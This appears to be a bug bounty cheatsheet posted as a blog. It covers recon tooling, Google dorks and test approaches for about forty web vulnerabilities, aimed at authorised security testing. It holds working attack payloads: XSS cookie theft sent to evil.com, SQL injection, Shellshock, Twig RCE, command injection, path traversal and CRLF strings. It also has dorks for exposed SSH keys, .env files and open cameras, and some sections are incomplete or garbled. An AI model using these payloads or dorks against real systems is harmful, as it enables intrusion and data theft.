---
title: Bug Bounty Essentials - A Comprehensive Cheatsheet
# author: Gauranga
date: 2024-04-21 16:50:00 +00:00
categories: [Writing]
tags: [Bug Bounty, Vulnerabilities, Security Flaws, Penetration Testing, Web Security, Exploits, Cybersecurity, Threat Hunting, Ethical Hacking, Risk Assessment]
pin: true
math: true
mermaid: true
image: https://miro.medium.com/v2/resize:fit:1400/1*wBuE9-f32uHnqH9Sq4EFiQ.png
#   path: /commons/devices-mockup.png
#   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
#   alt: Responsive rendering of Chirpy theme on multiple devices.
---

# Recon Workflow

## 1. Initial Reconnaissance

### 1.1 Finding Subdomains

1. **Linked & JS Discovery with Burp Suite Pro**
    - Turn off passive scanning
    - Set forms to auto-submit
    - Configure scope and keywords
    - Browse the main site
    - Spider all hosts
    - Go to Target → Scope → Advanced Scope Control → Add host or IP range
    - Show only scope items
    - Select all hosts → Engagement Tools → Analyze Target → Save report as HTML file
2. **Other Tools for Subdomain Discovery**
    - `Gospider`
    - `hakrawler`
    - `Subdomainizer`:
        - Find subdomains referenced in JS files
        - Identify cloud services referenced in JS files
        - Use Shannon Entropy formula to find potentially sensitive items in JS files
    - `subscraper`: If only looking for subdomains
3. **Scraping with Amass**
    - `amass -d example.com`
4. **Scraping with Subfinder v2**
    - `subfinder -d example.com -v`
5. **Scraping with [Github-subdomains.py](http://github-subdomains.py/)**
    - `python3 github-subdomains.py -t "githubpersonalaccounttoken" -d example.com > example.com`
6. **Scraping with Cloud Ranges**
    - Technique to monitor AWS, GCP, Azure for SSL

### 1.2 Subdomain Brute Forcing

1. **With Amass**
    - Guessing for live subdomains with a large list of common subdomain names
    - `amass enum -brute -d example.com -src`
    - `amass enum -brute -d example.com -rf resolvers.txt -w bruteforce.list`
2. **With shuffleDNS**
    - `shuffledns -d example.com -w words.txt -r resolvers-excellent.txt`
3. **Subdomain Brute Forcing Lists**
    - [Tomnomnom](https://github.com/tomnomnom)
    - [Assetnote Commonspeak2](https://github.com/Assetnote/commonspeak2)
4. **Alteration Scanning**
    - `altdns`:
        - `dev1.example.com`
        - `dev2.example.com`
        - `dev-1.example.com`

## 2. Infrastructure Discovery

1. **Finding Infrastructure Sources**
    - Censys
    - Robtex
    - Wayback Machine
    - DNSdumpster
    - [PTRarchive.com](http://ptrarchive.com/)
    - Netcraft
    - DNSDB Search
    - PassiveTotal
2. **Certificate Sources**
    - [crt.sh](https://crt.sh/)
    - Certspotter
    - CertDB
3. **Security Sources**
    - [Hackertarget](https://hackertarget.com/)
    - [Security Trails](https://securitytrails.com/)
    - [VirusTotal](https://www.virustotal.com/)
    - F-Secure
    - Riddler
    - [ThreatCrowd](https://www.threatcrowd.org/)
    - [ThreatMiner](https://www.threatminer.org/)

## 3. Port Analysis & Service Analysis

1. **Port Analysis with Massscan**
    - `massscan -p1-65535 <ip> --max-rate 1800 -oG outputfile.txt`
2. **Port Analysis with Dnmasscan**
    - `dnmasscan outputfile.txt dns.log -p80,443 -oG masscan.log`
3. **Service Scanning with Brutespray**
    - Scan remote administration protocols for default passwords, which takes Nmap OG file format
    - `Massscan` → `nmapservice scan -oG` → `brutespray credential brute force`

## 4. Vulnerability Discovery

1. **Subdomain Takeover**
    - [Can I Take Over XYZ GitHub Repo](https://github.com/haccer/subjack)
    - `SubOver`
    - `nuclei`
2. **Screenshotting**
    - `eyewitness`
    - `aquatone`
    - `httpscreenshot`

## 5. Google Dorking

1. **Scraping with Google**
    - `site:example.com -www.example.com`
    - `site:example.com -www.example.com -sub.example.com`
    - `site:example.com -www.example.com -sub.example.com -dev.example.com`

## 6. Automation Tools & Frameworks

1. **Extending Tools**
    - [Interlace](https://github.com/codingo/Interlace)
    - Recon Framework
    - [Tomnomnom Tools](https://github.com/tomnomnom/tools)
2. **C-tier Frameworks**
    - [AdmiralGaust/bountyRecon](https://github.com/AdmiralGaust/bountyRecon)
    - [offhoursscoding/recon](https://github.com/offhoursscoding/recon)
    - [Sambal0x/recon-tools](https://github.com/Sambal0x/recon-tools)
    - [JoshuaMart/Autorecon](https://github.com/JoshuaMart/Autorecon)
    - [yourbuddy25/Hunter](https://github.com/yourbuddy25/Hunter)
    - [ultimate_recon.sh](https://gist.github.com/dwisiswant05f647e3d406b5e984e6d69d3538968cd)
3. **B-tier Frameworks**
    - [capt-meelo/LazyRecon](https://github.com/capt-meelo/LazyRecon)
    - [phspade/Automated-Scanner](https://github.com/phspade/Automated-Scanner)
    - [shmilylty/OneForAll](https://github.com/shmilylty/OneForAll)
    - [SolomonSklash/chomp-scan](https://github.com/SolomonSklash/chomp-scan)
    - [TypeError/domained](https://github.com/TypeError/domained)
    - [Screetsec/Sudomy](https://github.com/Screetsec/Sudomy)
    - [devanshbatham/Gorecon](https://github.com/devanshbatham/Gorecon)
    - [LordNeoStark/tugarecon](https://github.com/LordNeoStark/tugarecon)
4. **A-tier Frameworks**
    - [Edu4rdSHL/findomain](https://github.com/Edu4rdSHL/findomain)
    - [SilverPoision/Rock-ON](https://github.com/SilverPoision/Rock-ON)
    - [epi052/recon-pipeline](https://github.com/epi052/recon-pipeline)
5. **S-tier Frameworks**
    - [Intrigue.io](https://intrigue.io/)
    - [AssetNote](https://www.assetnote.io/)
    - [Spiderfoot](https://www.spiderfoot.net/)
    - [Project Discovery Framework](https://chaos.projectdiscovery.io/) - Download subdomain files of all public programs in HackerOne & Bugcrowd, watch for new domains

## 7. Mindmaps

1. **XMind**
    - [XMind - Mind Mapping Software](https://www.xmind.net/)

---

# Google Dork Techniques

## 1. Basic Search Operators

- **cache:**
    
    Shows the cached version of any website.
    
    Example: `cache:example.com`
    
- **allintext:**
    
    Searches for specific text contained on any web page.
    
    Example: `allintext: hacking tools`
    
- **allintitle:**
    
    Searches for pages with titles containing specific text.
    
    Example: `allintitle:"Security Companies"`
    
- **allinurl:**
    
    Fetches results whose URL contains all the specified characters.
    
    Example: `allinurl: client area`
    
- **filetype:**
    
    Searches for specific file extensions.
    
    Example: `filetype: jpg filename:id_rsa`
    
- **inurl:**
    
    Searches for URLs containing a specific keyword.
    
    Example: `inurl: admin`
    
- **intitle:**
    
    Searches for keywords in the title of pages.
    
    Example: `intitle:secu`
    
- **inanchor:**
    
    Searches for pages with exact anchor text used in links.
    
    Example: `inanchor:"cyber security"`
    
- **intext:**
    
    Locates pages containing certain strings inside their text.
    
    Example: `intext:"safe internet"`
    
- **link:**
    
    Shows pages linking to a specified URL.
    
    Example: `link: microsoft.com`
    
- **site:**
    
    Shows a list of all indexed URLs for a specified domain or subdomain.
    
    Example: `site:securitytrails.com`
    
- **wildcard (*)**
    
    Used to search for pages that contain “anything” before your word.
    
    Example: `* a website`
    
- **logical OR (|)**
    
    Finds sites containing either one term or another.
    
    Example: `"security" "tips"`
    
- **plus (+)**
    
    Concatenates words to detect pages using more than one specific key.
    
    Example: `security + trails`
    
- **minus (-)**
    
    Excludes pages containing certain words.
    
    Example: `security -trails`
    

## 2. Advanced Search Techniques

- **Log Files**
    
    Searches for results including usernames inside log files.
    
    Example: `allintext:username filetype:log`
    
- **Vulnerable Web Servers**
    
    Detects vulnerable or hacked servers.
    
    Example: `inurl:/proc/self/cwd`
    
- **Open FTP Servers**
    
    Finds public FTP servers which may reveal interesting information.
    
    Example: `intitle:"index of" inurl:ftp`
    
- **ENV Files**
    
    Searches for .env files used by web development frameworks.
    
    Example: `site:example.com/.env`
    
- **SSH Private Keys**
    
    Finds exposed SSH private keys.
    
    Example: `intitle:index.of id_rsa -id_rsa.pub`
    
- **Putty Logs**
    
    Fetches SSH usernames from Putty logs.
    
    Example: `filetype:log username putty`
    
- **Email Lists**
    
    Searches for Excel files containing email addresses.
    
    Example: `filetype:xls inurl:"email.xls"`
    
- **University Email Lists**
    
    Filters for .edu domain names to find educational email lists.
    
    Example: `site:.edu filetype:xls inurl:"email.xls"`
    

## 3. Media and Camera Searches

- **Live Cameras**
    
    Fetches live camera web pages not restricted by IP.
    
    Example: `inurl:top.htm inurl:currenttime`
    
- **WebcamXP-Based Transmissions**
    
    Finds webcamXP-based live streams.
    
    Example: `intitle:"webcamXP 5"`
    
- **General Live Cameras**
    
    Finds general live camera feeds.
    
    Example: `inurl:"lvappl.htm"`
    
- **MP3 Files**
    
    Searches for MP3 files available on the web.
    
    Example: `intitle: index of mp3`
    
- **PDF Files**
    
    Finds legal free PDF documents.
    
    Example: `intitle: index of pdf intext: .mp4`
    
- **Weather Devices**
    
    Fetches transmissions from Weather Wing devices.
    
    Example: `intitle:"Weather Wing WS-2"`
    

---

# Vulnerability Testing and Approaches

### 1. Privilege Escalation

**Approach:** Horizontal (admin-admin & user to user) / Vertical Privilege Escalation (User to admin)

****

### 2. Privacy Settings Bugs

**Approach:** (Details missing)

****

### 3. Session Bugs

**Approach:**

- Check if session tokens/access tokens:
    - Expires on logout
    - Password reset/change
    - Expires on user removal
    - Expires on changing roles
    - Insufficient session fixation (cookie editor extension used)****

### 4. Insecure CORS Misconfiguration

**Approach:**

- Curl command to detect: `curl <http://site.com> -H "Origin:<http://evil.com>" -I`
- Check `Access-Control-Allow-Origin` header:
    - `` (not exploitable)
    - `origin: evil.com`
    - `origin: site.evil.com`
    - `origin: null`
- If any site disclosing usernames & password, try CORS exploit.**Tool Used:** Corsy / Burp Suite

### 5. CSRF

**Approach:**

- Intercept the victim request & generate CSRF PoC; send to server as an attacker
- CSRF can be GET or POST based
- Try in all state-changing requests
- Use [jsfiddle.net](http://jsfiddle.net/) online tool
- Check if it validates origin/referer. If not, CSRF is possible.
- Check if it is cookie-based authentication.
- If anti-CSRF tokens are present:
    1. Remove anti-CSRF tokens & parameter
    2. Pass blank parameter
    3. Add similar length token
    4. Add another user’s valid anti-CSRF token
    5. Random token in long length (e.g., `aaaaaaaaa`)
- If content-type verification:
    1. If no anti-CSRF tokens are present
    2. Try content-type: `text/plain`
- Flash CSRF
- Check if any cross-domain policy using SWF JSON tool.**Tool Used:** [jsfiddle.net](http://jsfiddle.net/) / Burp Suite

### 6. XSS

**Approach:**

1. Input value (try payload like `"<script>alert(document.domain)</script>"`) reflected without XSS protection
2. Use XSS validator - Intruder
3. Host header injection through XSS:
    - Add `referer: batman`
    - Add `hostheader: bing.com`
4. URL redirection through XSS:
    - `document.location.href="<http://evil.com>"`
5. Phishing through XSS - iframe injection:
    - `<iframe src="<http://evil.com>" height="100" width="100"></iframe>`
6. Cookie stealing through XSS:
    - `document.location.href="<http://evil.com/p/?page=>" + document.cookie`
7. File upload through XSS:
    - Upload a picture file, intercept it, and change `picture.jpg` to XSS payload using Intruder attack
8. Remote File Inclusion (RFI) through XSS:
    - `php?=http://brutelogic.com.br/poc.svg - xsspayload`
9. Convert self XSS to reflected one:
    - Copy response in a `file.html` -> it will work
10. XSS through URI parameters:
    - `site.com/about/xss"><script>`**Tool Used:** XSS Validator / Burp Suite

### 7. Host Header Injection

**Approach:**

1. URL redirection through host header:
    - Check URL having 2xx, 3xx
    - Change `X-forwarded-host` to `realweb.com` and `bing.com`
2. Web cache poisoning through Host Header Injection:
    - Injection will be reflected in any buttons of the page
3. Host header attack on password reset page
4. XSS through Host Header Injection****

### 8. URL Redirection or Open Redirect

**Approach:**

1. Common parameter list:
    - `dest`, `redirect`, `uri`, `path`, `continue`, `url`, `window`, `to`, `out`, `view`, `dir`, `show`, `navigation`, `open`, `u`, `file`, `val`, `validate`, `domain`, `callback`, `return`, `page`, `feed`, `host`, `port`, `next`, `data`, `reference`, `site`, `html`
2. Test URLs:
    - `site.com/bing.com`, `site.com//bing.com`, `site.com/payloads`****

### 9. Parameter Tampering

**Approach:** Apply to ecommerce websites

****

### 10. HTML Injection

**Approach:**

1. Use GET or POST method
2. Input value reflecting back
3. Test with HTML payload like `<h1>adam</h1>`
4. URL redirection via HTML injection****

### 11. File Inclusion

**Approach:**

1. Local File Inclusion (LFI) & Remote File Inclusion (RFI)
2. For LFI, try:
    - `any.com/index.php?reference=login.php`
3. For RFI, try:
    - `any.com/?share=http://evil.com/`
    - Common parameters to look for:
        - `file`, `document`, `folder`, `root`, `path`, `pg`, `style`, `pdf`, `template`, `php_path`, `doc`, `dest`, `redirect`, `uri`, `path`, `continue`, `url`, `window`, `next`, `data`, `reference`, `site`, `html`, `val`, `validate`, `domain`, `callback`, `return`, `page`, `feed`, `port`, `host`, `to`, `out`, `view`, `dir`, `show`, `navigation`, `open`
4. For LFI, check:
    - `/var/www/html/` & `/etc/passwd`
    - `../../etc/passwd`**Tool Used:** Lfisuite tool from GitHub

### 12. Missing SPF, DMARC Records

**Approach:**

- Detect missing SPF and DMARC records using:
    - `mxtoolbox.com`
    - `anonymousmail.me`
    - `https://emkei.cz/`**Tool Used:** [mxtoolbox.com](http://mxtoolbox.com/) / [anonymousmail.me](http://anonymousmail.me/) / https://emkei.cz/

### 13. SSRF (Server-Side Request Forgery)

**Approach:**

1. Make a request from a vulnerable application to a target website.
2. Common parameters to look for:
    - `dest`, `redirect`, `uri`, `path`, `continue`, `url`, `window`, `next`, `data`, `reference`, `site`, `html`, `val`, `validate`, `domain`, `callback`, `return`, `page`, `view`, `dir`, `show`, `file`, `document`, `folder`, `root`, `path`, `pg`, `style`, `pdf`, `template`, `php_path`, `doc`, `feed`, `host`, `port`, `to`, `out`, `navigation`, `open`, `result`
3. Detection using:
    - `https://www.expressvpn.com/what-is-my-ip`
    - Burp Collaborator
4. For exploitation, try:
    - `any.com/index/php?uri=http://external.com`
    - Read file from server (e.g., `file:///identf` using LFI payloads)
    - Scan internal network (e.g., `http://localhost:1` changing the port number to common ports like 21, 22)
    - SSRF with RFI: Execute code from the external domain (e.g., use `hackoff.html` with XSS script)**Tool Used:** Burp Collaborator / `https://www.expressvpn.com/what-is-my-ip`

### 14. Critical File Found & Source Code Disclosure

**Approach:**

1. Use payloads from:
    - `https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content`
2. Utilize `dirsearch`****

### 15. Subdomain Takeover

**Approach:**

- If the website is not in use by the target and is hosted on a service provider:
    - Sign up on service providers like GitHub, Heroku, Shopify, Zendesk, AWS, Tumblr, etc., to attempt domain takeover**Tool Used:** `github.com/nahamsec/HostileSubBruteforcer`

### 16. Command Injection

**Approach:**

1. Take input as a command and reflect the output of that command.
2. Common parameters to look for:
    - `daemon`, `host`, `upload`, `dir`, `execute`, `download`, `log`, `ip`, `cli`, `cmd`, `filename`
3. Find command injection using delimiter list (e.g., `;`, `^`, `&`, `&&`, `|`, `||`, `%0D`, `%0A`, `\\n`, `<`)
4. Identify input fields interacting with the OS shell.
5. Try with delimiter & shell commands (e.g., `;dir`, `;/etc/passwd`)
6. Intercept requests using Clusterbomb - first parameter for delimiter & second for command payloads**Tool Used:** `github.com/commixproject/commix.git`

### 17. File Upload Vulnerability

**Approach:**

1. Simple file upload (e.g., `shell.php`) for full control of the server and running shell commands.
2. Use payloads from:
    - `github.com/fuzzdb-projects/fuzzdb/tree/master/attack/file-upload/malicious-images`
3. Pixel flood attack.
4. Verify content type.
5. Check extension verification.**Tool Used:** `github.com/almandin/fuxploider`

### 18. XXE Injection (XML External Entity Injection)

**Approach:**

1. Use XXE payloads in Intruder to detect.
2. Check if the website is accepting `content-type=text/xml` header with a `200 OK` response.
3. Use online tool `pingb.in` to check for external ping.
4. For blind XXE, use Python’s SimpleHTTPServer (e.g., `python -m SimpleHTTPServer 80`).
5. SYSTEM `file:///etc/passwd` for local file read.
6. SYSTEM `http://systemip/readinganyfile` for blind XXE.
7. Use `php://` for Remote Code Execution (RCE).
8. Use Gopher or other URI handlers to exploit XXE.**Common Places to Find XXE:**
- XML file upload (e.g., config files)
- XML input fields
- XML-based APIs
- XML-based files (e.g., RSS, SVG)**Tool Used:** `pingb.in` / Burp Suite

### 19. Account Lockout

**Approach:**

1. Prevent brute-force attacks.
2. Intercept the login page with user credentials using Burp Suite.
3. Send the request to Sequencer.
4. Alternatively, use Intruder to make multiple requests (e.g., 1000 times).
5. Perform credential stuffing.
6. Ensure the account locks out for 30 minutes to 24 hours.****

### 20. Blind XSS

**Approach:**

1. A type of stored XSS where attacker input is saved in the server and stored in the database.
2. It won’t be reflected immediately.
3. Look for blind XSS in pages like:
    - Contact us
    - Log viewers
    - Feedback pages
    - Chat apps
    - Ticket generation apps
    - Any app using moderation or updates
    - Saving forms
4. Use the online tool `xsshunter.com`.
5. Copy the payload and paste it in the input field.
6. Reflection will be found on `xsshunter.com`.
7. Perform multiple blind XSS using Intruder.**** / [XSSHunter.com](http://xsshunter.com/)

### 21. Buffer Overflow (Web)

**Approach:**

1. Intercept the login page and pass a long string of passwords or other inputs. Observe if the page loads slowly.
2. Types of overflows to consider: Buffer, Stack, Heap, Integer, Format String.
3. Denial of Service (DoS) attacks using buffer overflow can be attempted.****

### 22. CMS Vulnerability Hunting

**Approach:**

1. Target common CMS platforms: WordPress, Joomla, Drupal, vBulletin, Magento.
2. Identify vulnerable components within the CMS.
3. Search for exploits using Google.**Tools Used:** WPScan, CMSMap, CMSSCAN, Joomscan, Drupwn, vBulletin Scanner, Mage Scanner, OWASP VBScan

### 23. IDOR (Insecure Direct Object References)

**Scenario 1:**

1. Often found in user settings or profile management.
2. Requires two accounts.
3. Intercept the request and change the email ID of the attacker.
4. Log out and attempt to log in with the victim's account to see if the change was successful.

**Scenario 2: User Moderation:**

1. Find the user ID.
2. Replace the victim’s ID with the attacker’s ID.
3. Perform the functionality to see if access is granted.****

### 24. Long Password DoS Attack

**Approach:**

1. Hashing passwords can be resource-intensive, leading to potential DoS.
2. Similar to buffer overflow attacks but specifically targeting password fields without length limits.
3. Sign up for an account and intercept the request.
4. Input a password longer than the typical length and forward the request.
5. This can cause application DoS.****

### 25. No Rate Limiting Vulnerability (Logical Flow)

**Approach:**

1. Capture the forgot password page or any similar request with Burp Suite.
2. Send the request to Intruder.
3. Make multiple requests (e.g., 1000 times) to test for rate limiting issues.
4. This can impact both user and server performance.****

### 26. Password Reset Poisoning

**Approach:**

1. Intercept the forgot password page with Burp Suite.
2. Perform a host header attack.
3. The victim will receive a password reset email from an "evil" website specified in the host header.****

### 27. Broken Access Control

**Approach:**

1. **IDOR Example:**
    - Access with account 1: `https://acme.com/changepw/id?=1234`
    - Create a second account and access it: `https://acme.com/changepw/id?=5678`
    - Logout from account 1, log into account 2, and attempt to change the password of account 1 by modifying the user ID in the request.
2. **Hash-Based IDOR:**
    - User IDs might be hashed (e.g., Base64).
3. **Local File Inclusion (LFI) & Path Traversal:**
    - Example request: `GET /view?pg=../../../../../etc/passwd%00`
4. **Common Parameters to Look For:**
    - `id`, `user`, `account`, `number`, `order`, `no`, `doc`, `key`, `email`, `group`, `profile`, `edit`
5. **Functions to Test:**
    - Change email, change password, upgrade/downgrade user role, create/remove/update/delete context-specific app data (e.g., shipping, invoices, document viewing).
6. **Missing Function Level Access Control:**
    - Forceful browsing (e.g., `GET /admin/viewTransactions`, `GET /ADMIN/viewTransactions`)
7. **Parameter Manipulation & Logic Bugs:**
    - Example: Giving a negative price.
8. **Logic Flow Vulnerabilities in E-commerce:**
    - Skipping steps in workflows (e.g., `additem->checkout->enter shipping info->payment`).

**Tools Used:** Burp Suite Extensions (AuthMatrix, AuthZ, Authorize, AutoRepeater)

### 28. Account Takeover via Forgot Password Page

**Approach:**

1. Intercept the forgot password page with Burp Suite.
2. Add `X-Forwarded-Host: bing.com` to the request header.
3. Forward the request to test for account takeover vulnerabilities.****

### 29. Broken Access Control

**Approach:**

1. Create an account.
2. Change the email ID from A to B.
3. Generate a forgot password request for email A.
4. Repeat the same process for passwords.****

### 30. Rate Limiting Bypass

**Approach:**

1. Intercept the forgot password page with Burp Suite.
2. Send the request to Intruder.
3. Add `X-Forwarded-Host: bing.com` to the request header.
4. Target the request to email and forward it to test for rate limiting bypass.****

### 31. Lack of Password Confirmation

**Approach:**

1. Required for actions such as deleting an account or changing an email ID.
2. Verify that a password confirmation step is missing in these processes.****

### 32. 2FA or OTP Bypass

**Approach:**

1. Complete the registration process and request an OTP code.
2. Intercept the OTP request using Burp Suite.
3. Send the intercepted request to Intruder.
4. Bruteforce the 6-digit OTP through Burp Intruder if there’s no rate limiting or CAPTCHA.
5. Analyze content length and attempt multiple combinations until bypassing OTP verification.****

### 33. Blind SQL Injection

**Approach:**

1. Check input fields and insert payloads such as `id=1`.
2. Insert payloads in user-agent or other input parameters.
3. Confirm by changing the time interval with payloads like:
    - `id=5+and+1=2`
    - `',0)waitfor delay'0:0:05'--`
    - `if(now()=sysdate(),sleep(5),0)) --`
    - `(select(0)from(select(sleep(3)))v)/*'+(select(3)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/`
    - `0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z`
    - `' and extractvalue(1,concat(0x0a,@@version)) or`**** or Cookie Manager

### 34. Remote Code Execution Vulnerability

**Approach:**

1. Visit the target website and create an account.
2. Verify the email address and navigate to profile settings.
3. Upload a malicious file (e.g., `RCE.php%00.gif`) as the company logo and save.
4. View the uploaded image URL and append `?cmd=id` to execute the `id` command.

**Scenario 2:**

1. Crawl the target website using Burp Suite.
2. Check for `/cgi-bin/status`.
3. Send to Repeater and replace `User-Agent` with payload like `{:;};echo $(</etc/passwd)`.
4. Send the request to see if it reveals root user info.**** or Manual

### 35. Stealing OAuth Token

**Approach:**

1. Log in using a third-party app (e.g., Facebook, Gmail).
2. Intercept the request using Burp Suite.
3. Modify `redirect_url` to a domain you control (e.g., `bugbountypoc.com`).
4. If necessary, change the `referer` header to the same domain.****

### 36. External Service Interaction

**Approach:**

1. Capture the request using Burp Suite.
2. Send the request to Repeater.
3. Replace `Host` header with Burp Collaborator payload or add a new `X-Forwarded-For` header with the same payload.
4. Forward the request and check if Burp Collaborator receives a DNS lookup request.****

### 37. Server-Side Include (SSI) Injection

**Approach:**

1. Intercept the request using Burp Suite.
2. Spider the target host.
3. Search for pages with `.shtml` extensions.
4. Inject payloads like `<!--#echo var="DATE_LOCAL" -->` into input fields.
5. Forward the request and check the response for injected data.****

### 38. Client and Server-Side Template Injection

**Approach:**

1. Check if user input is reflected on the webpage. Insert payloads to test for template injection.
2. Common Template Engines:
    - FreeMarker (Java-based)
    - Velocity (Java-based)
    - Smarty (PHP-based)
    - Twig (PHP-based)
    - Jade (Node.js-based)
    - Jinja2 (Python/Flask-based)

**Manual Checking:**

1. Example Payloads:
    - `curl -g '<http://www.target.com/page?name=John'`>
    - `curl -g '<http://www.target.com/page?name={{7*7}>}'`

**Automation Tool:**

1. `https://github.com/epinna/tplmap`

**Basic Payloads:**

- `{{7*7}}`
- `{{7*'7'}}`
- `{% extends "/etc/passwd" %}`

**RCE Payload (Twig):**

- `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`**Tool Used:** Manual Checking, curl, tplmap

### 39. Exif GeoLocation Data Not Stripped

**Approach:**

1. Download an image from `https://github.com/ianare/exif-samples`.
2. Go to JPG properties and check GPS data.
3. Upload the image to the target website.
4. Copy the image URL and paste it into an EXIF data tool (e.g., `http://metapicz.com/`).**Tool Used:** [Exif.regex.info/exif.cgi](http://exif.regex.info/exif.cgi)

### 40. CRLF Injection

**Approach:**

1. Capture a request using Burp Suite.
2. Insert arbitrary data in the input field (e.g., `aaaaaaaaaaaaa`).
3. If the input is reflected in the response header, it may be vulnerable.
4. Test Carriage Return (`%0A`) and Linefeed (`%0D`) payloads.
5. Example Payload:
    - `%0a%0dxxxxxxxxxxxxx`
    - `return_url=aaaa%0a%0dset-cookie:mycookie`****